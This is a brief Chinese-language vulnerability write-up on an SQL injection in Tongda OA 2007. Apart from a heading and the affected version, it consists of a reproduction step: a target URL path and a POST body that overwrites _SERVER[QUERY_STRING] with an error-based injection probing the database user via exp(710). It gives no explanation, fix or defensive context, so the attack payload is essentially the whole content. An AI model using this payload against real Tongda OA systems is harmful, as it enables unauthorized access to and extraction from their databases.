通达oa 2007 sql注入漏洞
=======================

一、漏洞简介
------------

二、漏洞影响
------------

通达oa 2007

三、复现过程
------------

    http://www.0-sec.org/general/document/index.php/setting/keywords/index

post提交

    _SERVER[QUERY_STRING]=kname=1%2Band@``%2Bor%2Bif(substr(user(),1,4)=root,1,exp(710))#
